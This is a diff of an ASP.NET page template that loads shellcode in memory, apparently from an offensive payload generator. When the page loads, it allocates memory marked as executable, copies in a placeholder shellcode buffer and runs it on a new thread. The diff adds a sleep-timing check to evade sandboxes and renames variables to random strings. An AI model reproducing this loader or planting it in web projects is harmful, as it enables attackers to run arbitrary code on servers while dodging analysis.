@@ -1,40 +1,37 @@
-<%@ Page Language="C#" AutoEventWireup="true" Inherits="System.Web.UI.Page" %>
-
-<%@ Import Namespace="System" %>
-<%@ Import Namespace="System.Runtime.InteropServices" %>
+<%@ Page Language="C#" AutoEventWireup="true" %>
 <%@ Import Namespace="System.IO" %>
-<%@ Import Namespace="System.Linq" %>
-<%@ Import Namespace="System.Diagnostics" %>
 //####INCLUDE####
-
 
 <script runat="server">
     private static Int32 MEM_COMMIT=0x1000;
     private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
 
+    [System.Runtime.InteropServices.DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);  
+    
     [System.Runtime.InteropServices.DllImport("kernel32")]
     private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);
 
     [System.Runtime.InteropServices.DllImport("kernel32")]
     private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);
-    
+
     //####DEFINE####
 
     //####CODE####
-
     protected void Page_Load(object sender, EventArgs e)
     {
         //####EVASION####
-
         byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
         //####CALL####
+        
+        DateTime t1 = DateTime.Now;
+        Sleep(5000);
+        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+        if (t2 < 4.5) {return;}
 
 
-        IntPtr handle =  VirtualAlloc(IntPtr.Zero,(UIntPtr)buf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        System.Runtime.InteropServices.Marshal.Copy(buf,0,handle,buf.Length);
-
-        IntPtr thrAndl = IntPtr.Zero;
-        IntPtr vn4FD0Agd = CreateThread(IntPtr.Zero,UIntPtr.Zero,handle,IntPtr.Zero,0,ref thrAndl);
+        IntPtr q2Lgv9EC = VirtualAlloc(IntPtr.Zero,(UIntPtr)buf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        System.Runtime.InteropServices.Marshal.Copy(buf,0,q2Lgv9EC,buf.Length);
+        IntPtr ee1Y3Tndd = IntPtr.Zero;
+        IntPtr amtl = CreateThread(IntPtr.Zero,UIntPtr.Zero,q2Lgv9EC,IntPtr.Zero,0,ref ee1Y3Tndd);
     }
-
 </script>
